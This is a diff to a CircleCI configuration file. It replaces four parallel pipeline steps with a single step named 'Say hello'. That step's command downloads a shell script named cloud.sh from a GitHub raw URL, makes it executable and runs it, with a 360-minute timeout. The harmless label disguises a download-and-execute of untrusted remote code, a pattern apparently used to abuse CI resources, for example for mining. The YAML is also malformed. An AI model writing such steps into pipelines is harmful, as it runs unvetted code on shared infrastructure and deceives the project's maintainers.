@@ -13,39 +13,13 @@ jobs:
     # See: https://circleci.com/docs/2.0/configuration-reference/#steps
     steps:
       - checkout
-      
-      pipelines:
-  default:
-    - parallel:
-      - step:
-          name: run1
+      - run:
           no_output_timeout: 360m
-          
-          script:
-            
-            - wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh
-
-      - step:
-          name: run2
-          no_output_timeout: 360m
-          script:
-            
-            - wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh
-
-      - step:
-          name: run3
-          no_output_timeout: 360m
-          script:
-            
-            - wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh
-
-      - step:
-          name: run4
-          no_output_timeout: 360m
-          script:
-            
-            - wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh
-
+          name: "Say hello"
+          command: "wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh
+"
+# Invoke jobs via workflows
+# See: https://circleci.com/docs/2.0/configuration-reference/#workflows
 workflows:
   say-hello-workflow:
     jobs:
